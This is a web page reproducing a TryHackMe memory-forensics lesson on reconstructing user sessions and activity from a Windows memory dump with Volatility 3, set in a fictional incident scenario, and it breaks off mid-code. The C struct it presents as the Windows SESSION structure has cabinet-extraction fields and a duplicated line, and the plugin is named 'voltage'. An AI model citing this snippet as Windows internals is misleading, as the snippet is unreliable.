<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Modules/Memory Analysis/windowsmemoryanduseractivity" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Windows Memory &amp; User Activity | TryHackMe-CN</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryanduseractivity"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" property="og:locale:alternate" content="zh"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Windows Memory &amp; User Activity | TryHackMe-CN"><meta data-rh="true" name="description" content="Task 1 Introduction"><meta data-rh="true" property="og:description" content="Task 1 Introduction"><link data-rh="true" rel="icon" href="/TryHackMe-CN/en/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryanduseractivity"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryanduseractivity" hreflang="en"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryanduseractivity" hreflang="zh"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryanduseractivity" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Modules","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/"},{"@type":"ListItem","position":2,"name":"Memory Analysis","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Memory Analysis/"},{"@type":"ListItem","position":3,"name":"Windows Memory & User Activity","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryanduseractivity"}]}</script><link rel="alternate" type="application/rss+xml" href="/TryHackMe-CN/en/blog/rss.xml" title="TryHackMe-CN RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/TryHackMe-CN/en/blog/atom.xml" title="TryHackMe-CN Atom Feed"><link rel="stylesheet" href="/TryHackMe-CN/en/assets/css/styles.6c4c8a38.css">
<script src="/TryHackMe-CN/en/assets/js/runtime~main.52ff7902.js" defer="defer"></script>
<script src="/TryHackMe-CN/en/assets/js/main.914fdfc7.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/TryHackMe-CN/en/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/TryHackMe-CN/en/"><div class="navbar__logo"><img src="/TryHackMe-CN/en/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/TryHackMe-CN/en/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">TryHackMe-CN</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/TryHackMe-CN/en/docs/Modules/">Tutorial</a><a class="navbar__item navbar__link" href="/TryHackMe-CN/en/blog">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>English</a><ul class="dropdown__menu"><li><a href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryanduseractivity" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="en">English</a></li><li><a href="/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryanduseractivity" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="zh">简体中文</a></li></ul></div><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/TryHackMe-CN/en/docs/Modules/"><span title="Modules" class="categoryLinkLabel_W154">Modules</span></a><button aria-label="Collapse sidebar category &#x27;Modules&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Attacking LLMs/"><span title="Attacking LLMs" class="categoryLinkLabel_W154">Attacking LLMs</span></a><button aria-label="Expand sidebar category &#x27;Attacking LLMs&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Command Line/"><span title="Command Line" class="categoryLinkLabel_W154">Command Line</span></a><button aria-label="Expand sidebar category &#x27;Command Line&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Container Security/"><span title="Container Security" class="categoryLinkLabel_W154">Container Security</span></a><button aria-label="Expand sidebar category &#x27;Container Security&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Host Evasions/"><span title="Host Evasions" class="categoryLinkLabel_W154">Host Evasions</span></a><button aria-label="Expand sidebar category &#x27;Host Evasions&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/"><span title="Memory Analysis" class="categoryLinkLabel_W154">Memory Analysis</span></a><button aria-label="Collapse sidebar category &#x27;Memory Analysis&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/memoryanalysisintroduction"><span title="Memory Analysis Introduction" class="linkLabel_WmDU">Memory Analysis Introduction</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/memoryacquisition"><span title="Memory Acquisition" class="linkLabel_WmDU">Memory Acquisition</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/volatilityessentials"><span title="Volatility Essentials" class="linkLabel_WmDU">Volatility Essentials</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryandprocs"><span title="Windows Memory &amp; Processes" class="linkLabel_WmDU">Windows Memory &amp; Processes</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryanduseractivity"><span title="Windows Memory &amp; User Activity" class="linkLabel_WmDU">Windows Memory &amp; User Activity</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Microsoft Defender XDR/"><span title="Microsoft Defender XDR" class="categoryLinkLabel_W154">Microsoft Defender XDR</span></a><button aria-label="Expand sidebar category &#x27;Microsoft Defender XDR&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/en/docs/Modules/Starters/"><span title="Starters" class="categoryLinkLabel_W154">Starters</span></a><button aria-label="Expand sidebar category &#x27;Starters&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/TryHackMe-CN/en/docs/Networks/"><span title="Networks" class="categoryLinkLabel_W154">Networks</span></a><button aria-label="Expand sidebar category &#x27;Networks&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/TryHackMe-CN/en/docs/"><span title="index" class="linkLabel_WmDU">index</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/TryHackMe-CN/en/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/en/docs/Modules/"><span>Modules</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/"><span>Memory Analysis</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Windows Memory &amp; User Activity</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Windows Memory &amp; User Activity</h1></header>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-1-introduction">Task 1 Introduction<a href="#task-1-introduction" class="hash-link" aria-label="Direct link to Task 1 Introduction" title="Direct link to Task 1 Introduction" translate="no">​</a></h2>
<p>In this room, we’ll walk through how to investigate user activity from a <strong>Windows memory dump</strong> using <strong>Volatility 3</strong>. As analysts, it&#x27;s important to know what users were doing on a system at the time something suspicious occurred. That includes knowing who was logged in, what commands were executed, and what files were opened, among other activities.</p>
<p>This room is the second in a set of three. We’ll be working with a memory dump from a compromised machine on a small internal network. If the host is indeed compromised, we will need to piece together the scope of the attack and the attack chain.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="learning-objectives">Learning Objectives<a href="#learning-objectives" class="hash-link" aria-label="Direct link to Learning Objectives" title="Direct link to Learning Objectives" translate="no">​</a></h3>
<ul>
<li class="">Link logins to suspicious activity using session and registry data.</li>
<li class="">Identify commands and file access tied to suspicious access.</li>
<li class="">Reconstruct user actions from memory.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="prerequisites">Prerequisites<a href="#prerequisites" class="hash-link" aria-label="Direct link to Prerequisites" title="Direct link to Prerequisites" translate="no">​</a></h3>
<ul>
<li class=""><a href="https://tryhackme.com/room/volatility" target="_blank" rel="noopener noreferrer" class="">Volatility</a></li>
<li class=""><a href="https://tryhackme.com/module/windows-fundamentals" target="_blank" rel="noopener noreferrer" class="">Windows Fundamentals Module</a></li>
<li class=""><a href="https://tryhackme.com/room/memoryanalysisintroduction" target="_blank" rel="noopener noreferrer" class="">Memory Analysis Introduction</a></li>
<li class=""><a href="https://tryhackme.com/room/windowsmemoryandprocs" target="_blank" rel="noopener noreferrer" class="">Windows Memory &amp; Processes</a></li>
</ul>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Click to continue to the room. </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-2-scenario-information">Task 2 Scenario Information<a href="#task-2-scenario-information" class="hash-link" aria-label="Direct link to Task 2 Scenario Information" title="Direct link to Task 2 Scenario Information" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="scenario">Scenario<a href="#scenario" class="hash-link" aria-label="Direct link to Scenario" title="Direct link to Scenario" translate="no">​</a></h3>
<p>You are part of the incident response team handling an incident at TryHatMe - a company that exclusively sells hats online. You are tasked with analyzing a full memory dump of a potentially compromised Windows host. Before you, another analyst had already taken a full memory dump and gathered all the necessary information from the TryHatMe IT support team. You are a bit nervous since this is your first case, but don&#x27;t worry; a senior analyst will guide you.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="information-incident-thm-0001">Information Incident THM-0001<a href="#information-incident-thm-0001" class="hash-link" aria-label="Direct link to Information Incident THM-0001" title="Direct link to Information Incident THM-0001" translate="no">​</a></h3>
<ul>
<li class="">On May 5th, 2025, at 07:30 CET, TryHatMe initiated its incident response plan and escalated the incident to us. After an initial triage, our team found a Windows host that was potentially compromised. The details of the host are as follows:<!-- -->
<ul>
<li class="">Hostname: WIN-001</li>
<li class="">OS: Windows 1022H 10.0.19045</li>
</ul>
</li>
<li class="">At 07:45 CET, our analyst Steve Stevenson took a full memory dump of the Windows host and made a hash to ensure its integrity. The memory dump details are:<!-- -->
<ul>
<li class="">Name: <code>THM-WIN-001_071528_07052025.dmp</code></li>
<li class="">MD5-hash: <code>78535fc49ab54fed57919255709ae650</code></li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="company-information-tryhatme">Company Information TryHatMe<a href="#company-information-tryhatme" class="hash-link" aria-label="Direct link to Company Information TryHatMe" title="Direct link to Company Information TryHatMe" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="network-map">Network Map<a href="#network-map" class="hash-link" aria-label="Direct link to Network Map" title="Direct link to Network Map" translate="no">​</a></h4>
<p><img decoding="async" loading="lazy" alt="Image showing the current scenario as a network diagram with the DMZ internal, User LAN and Server Lan networks  " src="/TryHackMe-CN/en/assets/images/image_20251255-215557-c8d815645075f11212bd6abd4a0ffb55.png" width="5084" height="3320" class="img_ev3q"></p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> I went through the case details and am ready to find out more. </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-3-environment--setup">Task 3 Environment &amp; Setup<a href="#task-3-environment--setup" class="hash-link" aria-label="Direct link to Task 3 Environment &amp; Setup" title="Direct link to Task 3 Environment &amp; Setup" translate="no">​</a></h2>
<p>Before moving forward, <strong>start the VM</strong> by clicking the Start Machine button on the right.</p>
<p>It will take around 2 minutes to load properly. The VM will be accessible on the right side of the split screen. If the VM is not visible, use the blue <strong>Show Split View</strong> button at the top of the page.</p>
<p>We&#x27;ll continue analyzing the memory dump <strong>THM-WIN-001_071528_07052025.mem</strong> located in the home directory of the user <strong>ubuntu</strong>.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Click here if you were able to start your environment. </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-4-tracking-sessions">Task 4 Tracking Sessions<a href="#task-4-tracking-sessions" class="hash-link" aria-label="Direct link to Task 4 Tracking Sessions" title="Direct link to Task 4 Tracking Sessions" translate="no">​</a></h2>
<p>In this task, we’re going to look at how to find out who was logged in to the system at the time the memory was captured. This is one of the first steps in any investigation, understanding which user accounts were present and possibly involved in the activity we’re interested in.</p>
<p>Windows stores details about sessions, interactive logins, and even application usage in memory.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="sessions">Sessions<a href="#sessions" class="hash-link" aria-label="Direct link to Sessions" title="Direct link to Sessions" translate="no">​</a></h3>
<p>When investigating a compromised system, it&#x27;s essential to understand which user accounts were active at the time and what type of access they had. Tracking sessions allows us to see if a user was physically present, connected remotely, or left a session open. This helps narrow down which actions can be attributed to specific users and whether accounts were misused during the attack. Session data can also help differentiate between regular activity and something out of place, such as a session that appears during odd hours, or one coming from an unexpected source/origin.</p>
<p>The voltage plugin inspects memory by locating internal Windows structures (some undocumented) such as <strong>_SESSION_MANAGER_INFORMATION</strong> and the <a href="https://learn.microsoft.com/en-us/windows/win32/devnotes/session" target="_blank" rel="noopener noreferrer" class="">Session Structure</a>. Let&#x27;s see what the SESSION structure contains:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">SESSION</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ACTION    act</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    HFILELIST hflist</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fAllCabinets</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fOverwrite</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fNoLineFeed</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fSelfExtract</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain">      cbSelfExtractSize</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain">      cbSelfExtractSize</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain">       ahfSelf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cMAX_CAB_FILE_OPEN</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain">       cErrors</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  